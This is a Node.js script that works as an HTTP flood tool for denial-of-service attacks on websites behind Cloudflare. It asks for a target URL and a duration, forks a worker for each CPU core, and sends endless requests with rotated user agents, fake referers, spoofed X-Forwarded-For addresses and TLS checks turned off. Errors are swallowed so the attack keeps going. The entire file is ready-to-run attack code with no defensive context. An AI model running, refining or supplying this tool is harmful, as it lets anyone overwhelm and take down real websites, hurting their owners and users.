const https = require('https');
const http = require('http');
const { URL } = require('url');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');

class AdvancedCFBypass {
    constructor() {
        this.userAgents = [
            // Updated browser user agents
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 6.0.1; SM-G800H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36'

        ];
        
        this.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.youtube.com/',
            'https://pornhub.com',
            'https://instagram.com',
            'https://fbi.com',
            'https://www.pinterest.com/search/?q='
        ];
        
        this.cfPorts = [80, 443, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096];
    }

    getRandomUserAgent() {
        return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }

    getRandomReferer() {
        return this.referers[Math.floor(Math.random() * this.referers.length)];
    }

    getRandomPort() {
        return this.cfPorts[Math.floor(Math.random() * this.cfPorts.length)];
    }

    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    async floodTarget(targetUrl) {
        const parsedUrl = new URL(targetUrl);
        const useHttps = parsedUrl.protocol === 'https:';
        const port = parsedUrl.port || this.getRandomPort();
        const path = parsedUrl.pathname || '/';
        
        const options = {
            hostname: parsedUrl.hostname,
            port: port,
            path: path,
            method: 'GET',
            headers: {
                'User-Agent': this.getRandomUserAgent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Referer': this.getRandomReferer(),
                'X-Forwarded-For': this.generateRandomIP(),
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            // Bypass SSL verification
            rejectUnauthorized: false
        };

        return new Promise((resolve) => {
            const protocol = useHttps ? https : http;
            const req = protocol.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    console.log(`Request completed to ${targetUrl} - Status: ${res.statusCode}`);
                    resolve();
                });
            });

            req.on('error', (e) => {
                // Silently handle errors to maintain attack
                resolve();
            });

            // Random POST data for POST requests
            if (Math.random() > 0.7) { // 30% chance for POST
                options.method = 'POST';
                req.write(crypto.randomBytes(32).toString('hex'));
            }

            req.end();
        });
    }

    async startClusterFlood(targetUrl, durationMs) {
        if (cluster.isMaster) {
            console.log(`[+] Master ${process.pid} is running`);
            console.log(`[+] Starting ${os.cpus().length} workers`);

            // Fork workers
            for (let i = 0; i < os.cpus().length; i++) {
                cluster.fork();
            }

            // Set attack duration
            setTimeout(() => {
                console.log('[+] Attack completed, killing workers');
                for (const id in cluster.workers) {
                    cluster.workers[id].kill();
                }
                process.exit(0);
            }, durationMs);

        } else {
            console.log(`[+] Worker ${process.pid} started`);
            // Each worker floods continuously
            while (true) {
                await this.floodTarget(targetUrl);
                // Random delay between 10-100ms to simulate human behavior
                await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 90) + 10));
            }
        }
    }
}

// Usage
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

readline.question('Enter target URL: ', (targetUrl) => {
    readline.question('Attack duration (minutes): ', (minutes) => {
        const durationMs = parseInt(minutes) * 60 * 1000;
        readline.close();

        // Validate URL
        if (!targetUrl.startsWith('http')) {
            targetUrl = 'https://' + targetUrl;
        }

        const attacker = new AdvancedCFBypass();
        console.log(`[+] Starting attack on ${targetUrl} for ${minutes} minutes`);
        attacker.startClusterFlood(targetUrl, durationMs);
    });
});
